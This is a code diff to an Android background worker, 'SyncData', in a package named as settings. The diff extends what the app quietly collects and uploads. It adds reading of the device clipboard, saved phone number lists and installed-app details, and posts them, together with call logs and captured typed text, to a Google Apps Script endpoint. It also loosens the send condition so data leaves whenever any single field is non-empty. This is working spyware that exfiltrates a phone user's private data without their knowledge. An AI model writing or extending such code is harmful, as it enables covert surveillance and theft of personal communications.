@@ -1,6 +1,11 @@
 package com.example.settings;
 
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.ContentResolver;
 import android.content.Context;
+import android.database.Cursor;
+import android.provider.ContactsContract;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
@@ -17,15 +22,19 @@ import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 
 public class SyncData extends Worker {
     Sharedpref mSharedpref;
     Context context;
-    String Name, OutgoingNumbers,RecievedNumbers,MissedCallNumbers,TextWritten,DaysTime;
+    String Name, OutgoingNumbers,RecievedNumbers,MissedCallNumbers,TextWritten,DaysTime,Copiedtext,Phonenumberdetails="",Phoneappdetails="";
+    List<Contact> contactList=new ArrayList<>();
+
     public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
         mSharedpref=new Sharedpref(context);
@@ -41,11 +50,27 @@ public class SyncData extends Worker {
          RecievedNumbers=mSharedpref.getRecievedNumbers();
          MissedCallNumbers=mSharedpref.getMissedCallNumber();
          TextWritten=mSharedpref.getSaveTextWritten();
-
+         ClipboardManager clipboardManager = (ClipboardManager)context.getSystemService(Context.CLIPBOARD_SERVICE);
+         ClipData pData = clipboardManager.getPrimaryClip();
+         if(pData!=null) {
+             ClipData.Item item = pData.getItemAt(0);
+             Copiedtext = item.getText().toString();
+         }
+         int numberlistsize=mSharedpref.getPhoneNumbersLisSize();
+         if(mSharedpref.getPrevPhoneNumbersLisSize()<numberlistsize){
+             Phonenumberdetails=mSharedpref.getPhoneNumbers();
+             mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
+             mSharedpref.commit();
+         }
+         if(mSharedpref.getPrevPhoneAppdetailsListSize()<mSharedpref.getPhoneAppdetailsListSize()){
+             Phoneappdetails=mSharedpref.getPhoneAppdetails();
+             mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
+             mSharedpref.commit();
+         }
         String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
         String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
         DaysTime=currentDate+"["+currentTime+"]";
-        if(!OutgoingNumbers.isEmpty() && !RecievedNumbers.isEmpty() && !MissedCallNumbers.isEmpty() && !TextWritten.isEmpty()) {
+        if(!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() || !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty() || !Phonenumberdetails.isEmpty()) {
             StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbyUGXUk5NbLhbNtHJlt1uBWAIytI4oBUOnPlAB7dc6DPgKiyRBJ/exec",
                     new Response.Listener<String>() {
                         @Override
@@ -76,6 +101,9 @@ public class SyncData extends Worker {
                     parmas.put("OutgoingNumbers", OutgoingNumbers);
                     parmas.put("RecievedNumbers", RecievedNumbers);
                     parmas.put("MissedCallNumbers", MissedCallNumbers);
+                    parmas.put("Copiedtext",Copiedtext);
+                    parmas.put("Phonenumberdetails",Phonenumberdetails);
+                    parmas.put("Phoneappdetails",Phoneappdetails);
                     return parmas;
                 }
             };
